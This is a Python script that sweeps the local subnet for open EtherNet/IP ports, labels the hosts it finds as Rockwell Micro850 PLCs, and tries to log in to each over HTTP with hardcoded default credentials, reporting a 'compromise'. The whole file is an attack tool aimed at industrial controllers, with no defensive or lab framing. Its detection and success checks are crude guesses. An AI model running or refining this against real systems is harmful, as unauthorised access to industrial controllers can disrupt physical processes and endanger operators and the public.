import socket
import requests
import netifaces
import time

# Default Credentials for Rockwell Micro850
DEFAULT_USERNAME = "administrator"
DEFAULT_PASSWORD = "password"

# Rockwell Micro850 Common TCP Ports
PORTS = [44818, 2222]  # Common for EtherNet/IP & CIP Protocol

def find_plc_ip():
    """
    Scans the local network to find a Rockwell Micro850 PLC.
    """
    ip_list = []
    
    # Get local network interface
    interfaces = netifaces.interfaces()
    
    for iface in interfaces:
        try:
            addrs = netifaces.ifaddresses(iface)[netifaces.AF_INET]
            for addr in addrs:
                ip = addr['addr']
                subnet = ".".join(ip.split(".")[:-1])  # Get subnet
                for i in range(1, 255):  # Scan within subnet range
                    target_ip = f"{subnet}.{i}"
                    for port in PORTS:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(0.5)
                            if s.connect_ex((target_ip, port)) == 0:
                                print(f"[+] Found PLC at {target_ip}:{port}")
                                ip_list.append(target_ip)
                                break
        except KeyError:
            continue  # Skip if interface doesn't support IPv4 connectivity
    
    return ip_list

def attempt_default_login(plc_ip):
    """
    Try logging into the PLC using default credentials via HTTP or CIP over Ethernet/IP.
    """
    try:
        url = f"http://{plc_ip}/login"  # Web-based login (if applicable)
        response = requests.post(url, data={
            "username": DEFAULT_USERNAME,
            "password": DEFAULT_PASSWORD
        }, timeout=3)

        if response.status_code == 200:
            print(f"[+] Success! Default credentials worked on {plc_ip}")
            return True
        else:
            print(f"[-] Failed login attempt on {plc_ip}")
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error to {plc_ip}")
    except requests.exceptions.Timeout:
        print(f"[-] Timeout while attempting connection to {plc_ip}")
    
    return False

if __name__ == "__main__":
    print("[*] Scanning network for Rockwell Micro850 PLCs...")
    plc_ips = find_plc_ip()

    if not plc_ips:
        print("[-] No PLCs found on the network.")
    else:
        for plc_ip in plc_ips:
            print(f"[*] Attempting default credentials on PLC at {plc_ip}...")
            success = attempt_default_login(plc_ip)
            if success:
                print(f"[!] Compromise successful on {plc_ip} with default credentials.")
            else:
                print(f"[-] Default credential attempt failed on {plc_ip}.")